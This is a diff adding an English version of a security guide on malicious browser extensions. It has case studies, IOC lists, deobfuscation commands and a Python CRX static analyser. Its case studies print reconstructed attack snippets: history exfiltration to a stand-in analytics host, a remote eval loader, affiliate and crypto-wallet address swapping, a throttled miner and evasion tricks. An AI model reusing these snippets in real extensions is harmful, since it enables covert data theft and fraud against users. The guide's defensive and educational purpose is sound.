@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # 악성 브라우저 확장 분석
 
 ## 1. 악성 확장 유형
@@ -946,3 +952,956 @@ if __name__ == "__main__":
 - DataSpii 분석 보고서: https://github.com/nicowillis/dataspii
 - Chrome 악성 확장 사례 모음: https://github.com/nicowillis/chrome-extension-iocs
 - CRX 파일 포맷: https://developer.chrome.com/docs/extensions/mv3/crx/
+
+---
+
+<a name="english"></a>
+
+# Malicious Browser Extension Analysis
+
+## 1. Malicious Extension Types
+
+### 1.1 Classification System
+
+```
+Malicious Extension Types
+├── Data Theft
+│   ├── Credential theft (passwords, cookies, tokens)
+│   ├── Browser history collection
+│   ├── Screenshot capture
+│   └── Form data interception
+├── Ad Injection
+│   ├── Injecting ads into pages
+│   ├── Manipulating search results
+│   └── Hijacking redirect traffic
+├── Cryptominer
+│   ├── CPU-based mining (Monero, etc.)
+│   └── GPU WebGL-based mining
+├── Clickjacking / Fraud
+│   ├── Affiliate link substitution
+│   ├── Shopping site price manipulation
+│   └── Cryptocurrency address substitution
+└── Spyware
+    ├── Keylogger
+    ├── Screen recording
+    └── Microphone/camera access
+```
+
+---
+
+## 2. Major Malicious Extension Case Studies
+
+### 2.1 DataSpii — Large-Scale Browser Data Leak (2019)
+
+**Overview:**
+- 8 Chrome/Firefox extensions collected browser history from millions of users
+- After purchasing domains from Namecheap, data was sent to external servers
+- Even well-known services like SimilarWeb were included
+
+**Core Attack Technique:**
+```javascript
+// DataSpii-type history collection pattern (for analysis/reproduction purposes)
+
+// Stage 1: Normal behavior immediately after installation (evading detection)
+chrome.runtime.onInstalled.addListener((details) => {
+  if (details.reason === 'install') {
+    // Wait a period after installation (evading sandbox analysis)
+    chrome.storage.local.set({ activationDelay: Date.now() + (7 * 24 * 60 * 60 * 1000) });
+  }
+});
+
+// Stage 2: Collect history after activation
+chrome.history.search({ text: '', maxResults: 10000 }, (historyItems) => {
+  const sensitiveUrls = historyItems.filter(item => {
+    // Filter for financial, medical, internal corporate URLs
+    return /bank|health|internal|admin|dashboard/.test(item.url);
+  });
+  // Send to external server (encoded to hide)
+  exfiltrate(sensitiveUrls);
+});
+
+// Stage 3: Real-time URL collection
+chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
+  if (changeInfo.status === 'complete') {
+    collectAndSend(tab.url, tab.title);
+  }
+});
+
+function exfiltrate(data) {
+  // Disguised as an image pixel request (evading network monitoring)
+  const encoded = btoa(JSON.stringify(data));
+  new Image().src = `https://analytics-cdn.example.com/pixel.gif?d=${encoded}`;
+}
+```
+
+**Detection Indicators:**
+- Persistent requests to external domains that look like analytics CDNs
+- Base64/encoded query parameters
+- Extensions using history and tabs permissions
+
+### 2.2 The Great Suspender Trojanized — Supply Chain Attack (2021)
+
+**Overview:**
+- Popular tab management extension (2M+ users) was acquired and malicious code was inserted
+- Leveraged the existing trusted extension ID → immediate large-scale distribution
+- Remote code execution capability and user tracking code added
+
+**Tampering Pattern:**
+```javascript
+// Malicious code pattern inserted among legitimate code (for analysis purposes)
+
+// Remote code loader hidden within normal tab management functionality
+(async function() {
+  try {
+    // Fetching what looks like a config URL but actually receives JS code
+    const response = await fetch('https://config-server.example.com/settings.json');
+    const config = await response.json();
+    
+    if (config.feature_flags && config.feature_flags.analytics_v2) {
+      // Execute code received from remote via eval (possible in V2)
+      // In V3, eval is prohibited and blocked
+      const remoteCode = atob(config.feature_flags.analytics_v2);
+      eval(remoteCode);  // Dangerous: executes malicious code
+    }
+  } catch (e) {
+    // Fail silently (evading detection)
+  }
+})();
+```
+
+**Detection Indicators:**
+- New permissions added after extension update
+- External JS loaded disguised as a config file
+- Sudden ownership change history
+
+### 2.3 Ad Injection Extension Pattern
+
+```javascript
+// Analysis of core ad injection techniques
+
+// Ad injection via DOM manipulation in Content Script
+(function() {
+  // Replace real ads with malicious ads
+  function replaceAds() {
+    document.querySelectorAll('iframe[src*="doubleclick"], iframe[src*="googlesyndication"]').forEach((iframe) => {
+      const newIframe = document.createElement('iframe');
+      newIframe.src = 'https://malicious-ads.example.com/ad.html';
+      newIframe.width = iframe.width;
+      newIframe.height = iframe.height;
+      newIframe.style.cssText = iframe.style.cssText;
+      iframe.parentNode.replaceChild(newIframe, iframe);
+    });
+  }
+
+  // Replace affiliate links on Amazon/shopping sites
+  function replaceAffiliateLinks() {
+    if (location.hostname.includes('amazon')) {
+      document.querySelectorAll('a[href*="/dp/"], a[href*="/gp/product/"]').forEach((link) => {
+        const url = new URL(link.href);
+        url.searchParams.set('tag', 'malicious-affiliate-id');
+        link.href = url.toString();
+      });
+    }
+  }
+
+  // Replace cryptocurrency wallet addresses
+  function replaceCryptoAddresses() {
+    const walletPattern = /\b(0x[a-fA-F0-9]{40}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b/g;
+    const attacker_wallet = '0xAttackerWalletAddressHere000000000000000';
+    
+    function processTextNode(node) {
+      if (walletPattern.test(node.textContent)) {
+        node.textContent = node.textContent.replace(walletPattern, attacker_wallet);
+      }
+    }
+
+    const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
+    while (walker.nextNode()) {
+      processTextNode(walker.currentNode);
+    }
+  }
+
+  replaceAds();
+  replaceAffiliateLinks();
+  replaceCryptoAddresses();
+})();
+```
+
+### 2.4 Cryptominer Extension Pattern
+
+```javascript
+// Cryptominer extension analysis (Background Service Worker)
+
+class CryptoMiner {
+  constructor() {
+    this.isRunning = false;
+    this.worker = null;
+  }
+
+  // Mining using WebWorker (avoids UI blocking)
+  start() {
+    if (this.isRunning) return;
+    
+    // Create Worker with Blob URL (dynamically created without a file)
+    const workerCode = `
+      self.onmessage = function(e) {
+        if (e.data.type === 'MINE') {
+          const { nonce, target } = e.data;
+          let found = null;
+          for (let i = nonce; i < nonce + 100000; i++) {
+            // Actual mining logic (simplified)
+            const hash = computeHash(i.toString());
+            if (hash < target) {
+              found = i;
+              break;
+            }
+          }
+          self.postMessage({ type: 'RESULT', nonce: found });
+        }
+      };
+      function computeHash(str) { return str; }  // Actually SHA-256
+    `;
+    
+    const blob = new Blob([workerCode], { type: 'application/javascript' });
+    this.worker = new Worker(URL.createObjectURL(blob));
+    this.isRunning = true;
+  }
+
+  // Throttle CPU usage (evading detection)
+  throttle(cpuLimit = 0.3) {
+    // Use only 30% CPU so the user doesn't notice
+    const activePeriod = cpuLimit * 1000;
+    const inactivePeriod = (1 - cpuLimit) * 1000;
+    
+    setInterval(() => {
+      if (this.worker) this.worker.postMessage({ type: 'MINE', nonce: Math.floor(Math.random() * 1e9), target: '0000' });
+    }, activePeriod + inactivePeriod);
+  }
+}
+```
+
+---
+
+## 3. Malicious Extension Detection Indicators (IOC)
+
+### 3.1 Static Analysis IOC
+
+```
+Manifest Level:
+- <all_urls> or https://*/* host permissions
+- webRequestBlocking + all URLs combination
+- nativeMessaging permission
+- Combination of 6 or more high-risk permissions
+- Wildcard domains in externally_connectable
+- eval, Function() usage in background scripts
+
+Code Level:
+- eval(), new Function(), setTimeout(string)
+- fetch/XMLHttpRequest to hardcoded external URLs
+- Direct access to document.cookie
+- Bulk reading from localStorage/sessionStorage
+- chrome.history.search() calls
+- chrome.cookies.getAll() calls
+- DOM-wide surveillance with MutationObserver
+- base64 encoded URLs or data
+- Obfuscated variable names (a0b1c2, _0x1234)
+- Excessive use of btoa/atob
+```
+
+### 3.2 Dynamic Analysis IOC
+
+```
+Network:
+- Data transmission disguised as image/pixel requests
+- Encoded query parameters (base64, hex)
+- Unusually long cookies or headers
+- High volume of requests to analytics/CDN domains
+- Communication with unknown C2 servers
+
+Behavior:
+- Delayed execution after installation (activating after 7+ days)
+- Code changes after visiting specific sites
+- Feature additions through remote updates
+- Code that only operates in incognito tabs
+```
+
+---
+
+## 4. Chrome Web Store Malicious Extension Distribution Techniques
+
+### 4.1 Initial Benign → Malicious Tampering Strategy
+
+```
+Step 1: Register a useful extension and build a user base
+  ↓
+Step 2: Accumulate reviews and manage ratings
+  ↓
+Step 3: Insert malicious code via automatic update after 3-6 months
+  ↓
+Step 4: Bypass code review through encoding/obfuscation
+  ↓
+Step 5: Load additional payload from remote server (V2 only)
+```
+
+### 4.2 Detection Evasion Techniques
+
+```javascript
+// Technique 1: Delayed execution (sandbox analysis evasion)
+chrome.storage.local.get(['firstInstall'], (data) => {
+  const now = Date.now();
+  if (!data.firstInstall) {
+    chrome.storage.local.set({ firstInstall: now });
+    return;  // Do not execute on first install
+  }
+  
+  const daysSinceInstall = (now - data.firstInstall) / (1000 * 60 * 60 * 24);
+  if (daysSinceInstall > 30) {
+    activateMaliciousPayload();  // Activate only after 30 days
+  }
+});
+
+// Technique 2: Targeted user activation (evading mass detection)
+chrome.storage.local.get(['userId'], (data) => {
+  if (data.userId && isTargeted(data.userId)) {
+    activatePayload();
+  }
+});
+
+// Technique 3: Region-based activation
+fetch('https://ipapi.co/json/').then(r => r.json()).then(loc => {
+  if (['KR', 'JP', 'US'].includes(loc.country_code)) {
+    activateRegionalPayload(loc.country_code);
+  }
+});
+
+// Technique 4: JavaScript obfuscation example
+// Original: chrome.cookies.getAll({}, function(c){ sendToServer(c); })
+// Obfuscated:
+var _0xa1b2 = ['getAll', 'cookies', 'sendToServer'];
+window['chr' + 'ome'][_0xa1b2[1]][_0xa1b2[0]]({}, function(c){ window[_0xa1b2[2]](c); });
+```
+
+---
+
+## 5. Analyzing Obfuscated Extension Code
+
+### 5.1 Manual Deobfuscation Procedure
+
+```bash
+# 1. Extract CRX file
+unzip extension.crx -d extension_dir/
+
+# 2. Format JavaScript files
+npx prettier --write extension_dir/**/*.js
+
+# 3. Find string literal substitution patterns
+grep -r "_0x[0-9a-f]\{4\}" extension_dir/ --include="*.js"
+
+# 4. Search for base64-encoded strings
+grep -r "atob\|btoa" extension_dir/ --include="*.js"
+
+# 5. Search for dynamic function execution
+grep -r "eval\|Function(" extension_dir/ --include="*.js"
+
+# 6. Extract external URLs
+grep -rEo "https?://[^ '\"]+[^ '\".,)]" extension_dir/ --include="*.js" | sort -u
+```
+
+### 5.2 Using Automated Deobfuscation Tools
+
+```bash
+# Install and run js-beautify
+npm install -g js-beautify
+js-beautify -r extension_dir/**/*.js
+
+# synchrony (automated deobfuscation)
+npm install -g @deobfuscate/synchrony
+synchrony deobfuscate obfuscated.js -o deobfuscated.js
+
+# webcrack (bundle analysis)
+npm install -g webcrack
+webcrack bundle.js
+```
+
+---
+
+## 6. Python CRX Automated Analysis Script
+
+### 6.1 CRX File Structure
+
+```
+CRX3 Format:
+[4 bytes magic: Cr24]
+[4 bytes version: 3]
+[4 bytes header size]
+[Header data (protobuf)]
+[ZIP data]
+```
+
+### 6.2 Complete CRX Analysis Tool
+
+```python
+#!/usr/bin/env python3
+"""
+CRX Browser Extension Automated Analysis Tool
+Usage: python3 crx_analyzer.py <crx_file_or_directory>
+"""
+
+import argparse
+import base64
+import hashlib
+import json
+import os
+import re
+import struct
+import sys
+import zipfile
+from dataclasses import dataclass, field
+from pathlib import Path
+from typing import Optional
+import tempfile
+
+
+# ───────────────────────────── Data Classes ─────────────────────────────
+
+@dataclass
+class PermissionRisk:
+    name: str
+    level: str  # critical / high / medium / low
+    reason: str
+
+
+@dataclass
+class Finding:
+    category: str
+    severity: str  # critical / high / medium / low / info
+    title: str
+    detail: str
+    file: str = ""
+    line: int = 0
+
+
+@dataclass
+class ExtensionReport:
+    name: str
+    version: str
+    manifest_version: int
+    extension_id: str = ""
+    permissions: list[str] = field(default_factory=list)
+    host_permissions: list[str] = field(default_factory=list)
+    permission_risks: list[PermissionRisk] = field(default_factory=list)
+    external_urls: list[str] = field(default_factory=list)
+    findings: list[Finding] = field(default_factory=list)
+    files: list[str] = field(default_factory=list)
+    overall_risk: str = "low"
+
+
+# ───────────────────────────── Permission Risk DB ─────────────────────────────
+
+PERMISSION_RISK_DB: dict[str, tuple[str, str]] = {
+    "<all_urls>":           ("critical", "Full access to all URLs"),
+    "webRequestBlocking":   ("critical", "Can block and modify HTTP requests"),
+    "nativeMessaging":      ("critical", "Communicates with local system applications"),
+    "debugger":             ("critical", "Access to Chrome DevTools Protocol"),
+    "proxy":                ("critical", "Intercept traffic by changing proxy settings"),
+    "management":           ("critical", "Install/remove/enable other extensions"),
+    "cookies":              ("high",     "Read/write cookies for all domains"),
+    "history":              ("high",     "Access to full browser browsing history"),
+    "tabs":                 ("high",     "Access to all tab URLs and titles"),
+    "webRequest":           ("high",     "Observe HTTP requests"),
+    "downloads":            ("high",     "Manage file downloads"),
+    "contentSettings":      ("high",     "Modify per-site content settings"),
+    "storage":              ("medium",   "Extension local storage"),
+    "notifications":        ("medium",   "Display system notifications"),
+    "bookmarks":            ("medium",   "Read/write bookmarks"),
+    "clipboardRead":        ("high",     "Read clipboard"),
+    "clipboardWrite":       ("medium",   "Write to clipboard"),
+    "geolocation":          ("high",     "User location information"),
+    "activeTab":            ("low",      "Current tab only (requires user gesture)"),
+    "scripting":            ("medium",   "Dynamic script injection"),
+    "declarativeNetRequest":("medium",   "Rule-based network request processing"),
+}
+
+# Malicious code patterns
+MALICIOUS_PATTERNS: list[tuple[str, str, str]] = [
+    (r"eval\s*\(",                          "high",     "eval() usage — dynamic code execution"),
+    (r"new\s+Function\s*\(",               "high",     "Function() constructor — dynamic code execution"),
+    (r"setTimeout\s*\(\s*[\"']",           "medium",   "setTimeout called with string"),
+    (r"setInterval\s*\(\s*[\"']",          "medium",   "setInterval called with string"),
+    (r"document\.write\s*\(",              "medium",   "document.write usage"),
+    (r"innerHTML\s*=\s*[^=]",             "medium",   "Direct innerHTML assignment — XSS risk"),
+    (r"chrome\.cookies\.getAll",           "high",     "Collecting all cookies"),
+    (r"chrome\.history\.search",           "high",     "History search"),
+    (r"atob\s*\(",                          "medium",   "Base64 decoding — suspected obfuscation"),
+    (r"_0x[0-9a-f]{4}",                    "high",     "Hexadecimal obfuscation pattern"),
+    (r"unescape\s*\(",                     "medium",   "unescape call — encoding bypass"),
+    (r"String\.fromCharCode",              "medium",   "charCode string generation — obfuscation"),
+    (r"document\.cookie",                  "high",     "Direct document.cookie access"),
+    (r"localStorage\[|localStorage\.",     "medium",   "localStorage access"),
+    (r"sessionStorage\[|sessionStorage\.", "medium",   "sessionStorage access"),
+    (r"navigator\.userAgent",              "low",      "UserAgent collection"),
+    (r"screen\.width|screen\.height",      "low",      "Screen info collection"),
+    (r"new\s+Image\(\)\.src\s*=",         "high",     "Image pixel tracking — data exfiltration technique"),
+    (r"fetch\s*\(\s*['\"]https?://",      "medium",   "External URL fetch request"),
+    (r"XMLHttpRequest",                    "medium",   "XMLHttpRequest usage"),
+    (r"WebSocket\s*\(",                    "medium",   "WebSocket connection"),
+]
+
+# Secret patterns
+SECRET_PATTERNS: list[tuple[str, re.Pattern]] = [
+    ("API Key",      re.compile(r"['\"]?api[_-]?key['\"]?\s*[:=]\s*['\"][A-Za-z0-9\-_]{20,}['\"]", re.I)),
+    ("Secret",       re.compile(r"['\"]?secret['\"]?\s*[:=]\s*['\"][A-Za-z0-9\-_+/]{20,}['\"]", re.I)),
+    ("Password",     re.compile(r"['\"]?pass(?:word)?['\"]?\s*[:=]\s*['\"][^'\"]{8,}['\"]", re.I)),
+    ("Private Key",  re.compile(r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----")),
+    ("AWS Key",      re.compile(r"AKIA[0-9A-Z]{16}")),
+    ("Token",        re.compile(r"['\"]?token['\"]?\s*[:=]\s*['\"][A-Za-z0-9\-_.]{20,}['\"]", re.I)),
+]
+
+# External URL pattern
+EXTERNAL_URL_PATTERN = re.compile(r"https?://[a-zA-Z0-9\-._~:/?#\[\]@!$&'()*+,;=%]+")
+CHROME_EXT_PATTERN = re.compile(r"chrome-extension://|moz-extension://")
+
+
+# ───────────────────────────── CRX Parser ─────────────────────────────
+
+class CRXParser:
+    CRX3_MAGIC = b"Cr24"
+    
+    @classmethod
+    def extract(cls, crx_path: Path, output_dir: Path) -> bool:
+        """Extract CRX file and save to output_dir"""
+        data = crx_path.read_bytes()
+        
+        if data[:4] == cls.CRX3_MAGIC:
+            return cls._extract_crx3(data, output_dir)
+        elif data[:2] == b"PK":
+            # Already in ZIP format
+            with zipfile.ZipFile(crx_path) as zf:
+                zf.extractall(output_dir)
+            return True
+        else:
+            print(f"[!] Unknown CRX format: {data[:4]}")
+            return False
+    
+    @classmethod
+    def _extract_crx3(cls, data: bytes, output_dir: Path) -> bool:
+        """Process CRX3 format"""
+        try:
+            # Read header size (bytes 8-12)
+            header_size = struct.unpack_from("<I", data, 8)[0]
+            zip_start = 12 + header_size
+            zip_data = data[zip_start:]
+            
+            with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
+                tmp.write(zip_data)
+                tmp_path = tmp.name
+            
+            with zipfile.ZipFile(tmp_path) as zf:
+                zf.extractall(output_dir)
+            
+            os.unlink(tmp_path)
+            return True
+        except Exception as e:
+            print(f"[!] CRX3 extraction failed: {e}")
+            return False
+
+
+# ───────────────────────────── Analysis Engine ─────────────────────────────
+
+class ExtensionAnalyzer:
+    def __init__(self, extension_dir: Path):
+        self.ext_dir = extension_dir
+        self.report = ExtensionReport(name="", version="", manifest_version=2)
+    
+    def analyze(self) -> ExtensionReport:
+        manifest_path = self.ext_dir / "manifest.json"
+        if not manifest_path.exists():
+            raise FileNotFoundError(f"manifest.json not found: {manifest_path}")
+        
+        self._parse_manifest(manifest_path)
+        self._analyze_js_files()
+        self._calculate_overall_risk()
+        return self.report
+    
+    def _parse_manifest(self, manifest_path: Path) -> None:
+        """Parse and analyze manifest.json"""
+        try:
+            manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
+        except json.JSONDecodeError as e:
+            self.report.findings.append(Finding(
+                category="manifest",
+                severity="high",
+                title="manifest.json parse error",
+                detail=str(e),
+                file="manifest.json"
+            ))
+            return
+        
+        self.report.name = manifest.get("name", "Unknown")
+        self.report.version = manifest.get("version", "Unknown")
+        self.report.manifest_version = manifest.get("manifest_version", 2)
+        
+        # Collect permissions
+        perms = manifest.get("permissions", [])
+        host_perms = manifest.get("host_permissions", [])
+        
+        # In V2, host permissions are included inside permissions
+        if self.report.manifest_version == 2:
+            url_perms = [p for p in perms if p.startswith("http") or p == "<all_urls>"]
+            api_perms = [p for p in perms if not (p.startswith("http") or p == "<all_urls>")]
+            self.report.permissions = api_perms
+            self.report.host_permissions = url_perms
+        else:
+            self.report.permissions = perms
+            self.report.host_permissions = host_perms
+        
+        self._assess_permissions()
+        self._check_manifest_issues(manifest)
+    
+    def _assess_permissions(self) -> None:
+        """Assess permission risk levels"""
+        all_perms = self.report.permissions + self.report.host_permissions
+        
+        for perm in all_perms:
+            if perm in PERMISSION_RISK_DB:
+                level, reason = PERMISSION_RISK_DB[perm]
+                self.report.permission_risks.append(
+                    PermissionRisk(name=perm, level=level, reason=reason)
+                )
+            elif perm.startswith("http") or perm.startswith("<all_urls>"):
+                self.report.permission_risks.append(
+                    PermissionRisk(
+                        name=perm,
+                        level="high" if "*" in perm else "medium",
+                        reason=f"Host permission: {perm}"
+                    )
+                )
+    
+    def _check_manifest_issues(self, manifest: dict) -> None:
+        """Check manifest security settings"""
+        
+        # CSP check
+        csp = manifest.get("content_security_policy", "")
+        if isinstance(csp, dict):
+            csp = csp.get("extension_pages", "")
+        
+        if not csp:
+            self.report.findings.append(Finding(
+                category="csp",
+                severity="medium",
+                title="CSP not configured",
+                detail="content_security_policy is not set",
+                file="manifest.json"
+            ))
+        else:
+            if "unsafe-eval" in csp:
+                self.report.findings.append(Finding(
+                    category="csp",
+                    severity="high",
+                    title="CSP unsafe-eval allowed",
+                    detail="Dynamic code execution via eval() is allowed",
+                    file="manifest.json"
+                ))
+            if "unsafe-inline" in csp:
+                self.report.findings.append(Finding(
+                    category="csp",
+                    severity="medium",
+                    title="CSP unsafe-inline allowed",
+                    detail="Inline script execution is allowed",
+                    file="manifest.json"
+                ))
+        
+        # externally_connectable check
+        ext_conn = manifest.get("externally_connectable", {})
+        matches = ext_conn.get("matches", [])
+        for m in matches:
+            if "*" in m:
+                self.report.findings.append(Finding(
+                    category="externally_connectable",
+                    severity="high",
+                    title="externally_connectable wildcard",
+                    detail=f"Messages can be sent to extension from arbitrary origins: {m}",
+                    file="manifest.json"
+                ))
+        
+        # Detect dangerous permission combinations
+        critical_perms = [r for r in self.report.permission_risks if r.level == "critical"]
+        if len(critical_perms) >= 2:
+            self.report.findings.append(Finding(
+                category="permissions",
+                severity="critical",
+                title="Multiple critical permissions held",
+                detail=f"{len(critical_perms)} critical permissions: {[p.name for p in critical_perms]}",
+                file="manifest.json"
+            ))
+    
+    def _analyze_js_files(self) -> None:
+        """Static analysis of JavaScript files"""
+        js_files = list(self.ext_dir.rglob("*.js"))
+        self.report.files = [str(f.relative_to(self.ext_dir)) for f in js_files]
+        
+        for js_file in js_files:
+            rel_path = str(js_file.relative_to(self.ext_dir))
+            try:
+                content = js_file.read_text(encoding="utf-8", errors="ignore")
+            except OSError:
+                continue
+            
+            self._scan_malicious_patterns(content, rel_path)
+            self._scan_secrets(content, rel_path)
+            self._extract_external_urls(content, rel_path)
+    
+    def _scan_malicious_patterns(self, content: str, filename: str) -> None:
+        """Scan for malicious patterns"""
+        lines = content.splitlines()
+        
+        for pattern_str, severity, description in MALICIOUS_PATTERNS:
+            pattern = re.compile(pattern_str)
+            for line_num, line in enumerate(lines, 1):
+                if pattern.search(line):
+                    self.report.findings.append(Finding(
+                        category="malicious_pattern",
+                        severity=severity,
+                        title=description,
+                        detail=line.strip()[:100],
+                        file=filename,
+                        line=line_num
+                    ))
+                    break  # Report each pattern only once per file
+    
+    def _scan_secrets(self, content: str, filename: str) -> None:
+        """Scan for hardcoded secrets"""
+        for secret_type, pattern in SECRET_PATTERNS:
+            match = pattern.search(content)
+            if match:
+                snippet = match.group(0)[:50] + ("..." if len(match.group(0)) > 50 else "")
+                self.report.findings.append(Finding(
+                    category="hardcoded_secret",
+                    severity="critical",
+                    title=f"Hardcoded {secret_type} detected",
+                    detail=snippet,
+                    file=filename
+                ))
+    
+    def _extract_external_urls(self, content: str, filename: str) -> None:
+        """Extract external URLs"""
+        urls = EXTERNAL_URL_PATTERN.findall(content)
+        for url in urls:
+            if not CHROME_EXT_PATTERN.match(url):
+                if url not in self.report.external_urls:
+                    self.report.external_urls.append(url)
+    
+    def _calculate_overall_risk(self) -> None:
+        """Calculate overall risk level"""
+        severity_scores = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}
+        
+        max_score = 0
+        for finding in self.report.findings:
+            max_score = max(max_score, severity_scores.get(finding.severity, 0))
+        
+        for risk in self.report.permission_risks:
+            max_score = max(max_score, severity_scores.get(risk.level, 0))
+        
+        score_to_risk = {4: "critical", 3: "high", 2: "medium", 1: "low", 0: "info"}
+        self.report.overall_risk = score_to_risk.get(max_score, "low")
+
+
+# ───────────────────────────── Reporter ─────────────────────────────
+
+class ReportPrinter:
+    COLORS = {
+        "critical": "\033[91m",  # Bright red
+        "high":     "\033[31m",  # Red
+        "medium":   "\033[33m",  # Yellow
+        "low":      "\033[32m",  # Green
+        "info":     "\033[36m",  # Cyan
+        "reset":    "\033[0m",
+    }
+    
+    @classmethod
+    def color(cls, text: str, level: str) -> str:
+        c = cls.COLORS.get(level, "")
+        return f"{c}{text}{cls.COLORS['reset']}"
+    
+    @classmethod
+    def print_report(cls, report: ExtensionReport) -> None:
+        print("\n" + "="*60)
+        print(f"  Extension Analysis Report: {report.name} v{report.version}")
+        print("="*60)
+        
+        risk_colored = cls.color(report.overall_risk.upper(), report.overall_risk)
+        print(f"\n[Overall Risk] {risk_colored}")
+        print(f"[Manifest] V{report.manifest_version}")
+        print(f"[File Count] {len(report.files)}")
+        
+        # Permission summary
+        print("\n--- Permission Analysis ---")
+        for level in ["critical", "high", "medium", "low"]:
+            risks = [r for r in report.permission_risks if r.level == level]
+            if risks:
+                print(f"  {cls.color(level.upper(), level)}:")
+                for r in risks:
+                    print(f"    • {r.name}: {r.reason}")
+        
+        # External URL summary
+        if report.external_urls:
+            print(f"\n--- External URLs ({len(report.external_urls)}) ---")
+            for url in report.external_urls[:10]:
+                print(f"  • {url[:80]}")
+            if len(report.external_urls) > 10:
+                print(f"  ... and {len(report.external_urls) - 10} more")
+        
+        # Security findings
+        if report.findings:
+            print(f"\n--- Security Findings ({len(report.findings)}) ---")
+            for f in sorted(report.findings, key=lambda x: {"critical":0,"high":1,"medium":2,"low":3,"info":4}.get(x.severity, 5)):
+                loc = f" [{f.file}:{f.line}]" if f.line else (f" [{f.file}]" if f.file else "")
+                print(f"  [{cls.color(f.severity.upper(), f.severity)}] {f.title}{loc}")
+                if f.detail:
+                    print(f"    → {f.detail[:80]}")
+        else:
+            print("\n[+] No malicious patterns detected")
+        
+        print("\n" + "="*60 + "\n")
+    
+    @classmethod
+    def export_json(cls, report: ExtensionReport, output_path: Path) -> None:
+        """Save report in JSON format"""
+        import dataclasses
+        data = dataclasses.asdict(report)
+        output_path.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")
+        print(f"[+] JSON report saved: {output_path}")
+
+
+# ───────────────────────────── Main Entry ─────────────────────────────
+
+def parse_args() -> argparse.Namespace:
+    parser = argparse.ArgumentParser(
+        description="Automated security analysis of browser extension (.crx or directory)",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  python3 crx_analyzer.py extension.crx
+  python3 crx_analyzer.py /path/to/extension_dir
+  python3 crx_analyzer.py extension.crx --json report.json
+  python3 crx_analyzer.py extensions/ --batch
+"""
+    )
+    parser.add_argument("target", help="Analysis target (.crx file or extension directory)")
+    parser.add_argument("--json", metavar="OUTPUT", help="JSON report save path")
+    parser.add_argument("--batch", action="store_true", help="Batch analyze all CRX in directory")
+    parser.add_argument("--min-risk", choices=["critical","high","medium","low","info"],
+                        default="info", help="Only output this risk level and above (default: info)")
+    return parser.parse_args()
+
+
+def analyze_target(target_path: Path, json_output: Optional[Path] = None) -> ExtensionReport:
+    """Analyze a single extension"""
+    with tempfile.TemporaryDirectory() as tmp_dir:
+        work_dir = Path(tmp_dir) / "ext"
+        
+        if target_path.suffix.lower() == ".crx":
+            print(f"[*] Extracting CRX: {target_path.name}")
+            if not CRXParser.extract(target_path, work_dir):
+                raise RuntimeError("CRX extraction failed")
+        elif target_path.is_dir():
+            work_dir = target_path
+        else:
+            raise ValueError(f"Unsupported format: {target_path}")
+        
+        analyzer = ExtensionAnalyzer(work_dir)
+        report = analyzer.analyze()
+        
+        ReportPrinter.print_report(report)
+        
+        if json_output:
+            ReportPrinter.export_json(report, json_output)
+        
+        return report
+
+
+def main() -> int:
+    args = parse_args()
+    target = Path(args.target)
+    
+    if not target.exists():
+        print(f"[!] Path not found: {target}", file=sys.stderr)
+        return 1
+    
+    try:
+        if args.batch and target.is_dir():
+            crx_files = list(target.glob("*.crx"))
+            if not crx_files:
+                print(f"[!] No CRX files found: {target}", file=sys.stderr)
+                return 1
+            
+            print(f"[*] Batch analysis: {len(crx_files)} CRX files")
+            reports = []
+            for crx in crx_files:
+                print(f"\n{'─'*40}")
+                try:
+                    report = analyze_target(crx)
+                    reports.append(report)
+                except Exception as e:
+                    print(f"[!] Analysis failed {crx.name}: {e}")
+            
+            # Summary statistics
+            risk_counts = {"critical":0,"high":0,"medium":0,"low":0}
+            for r in reports:
+                risk_counts[r.overall_risk] = risk_counts.get(r.overall_risk, 0) + 1
+            
+            print("\n=== Batch Analysis Summary ===")
+            for level, count in risk_counts.items():
+                if count:
+                    print(f"  {ReportPrinter.color(level.upper(), level)}: {count}")
+        else:
+            json_path = Path(args.json) if args.json else None
+            analyze_target(target, json_path)
+    
+    except Exception as e:
+        print(f"[!] Error: {e}", file=sys.stderr)
+        return 1
+    
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+```
+
+---
+
+## 7. Extension IOC Checklist
+
+```
+□ Review manifest.json permission list
+  □ <all_urls> or all HTTPS URL host permissions
+  □ webRequestBlocking + cookies combination
+  □ nativeMessaging permission
+  □ management or debugger permission
+
+□ JavaScript code patterns
+  □ eval() or new Function() calls
+  □ Excessive use of atob/btoa
+  □ _0x-style variable names (obfuscation)
+  □ Image pixel tracking pattern
+  □ Sending chrome.storage data to external servers
+
+□ Network patterns
+  □ Unknown analytics/ad CDN domains
+  □ Encoded query parameters
+  □ Irregular heartbeat requests
+
+□ Behavioral patterns
+  □ Delayed activation after installation
+  □ Only active when visiting specific sites
+  □ Permission increase after update
+```
+
+---
+
+## References
+
+- DataSpii Analysis Report: https://github.com/nicowillis/dataspii
+- Chrome Malicious Extension Case Collection: https://github.com/nicowillis/chrome-extension-iocs
+- CRX File Format: https://developer.chrome.com/docs/extensions/mv3/crx/
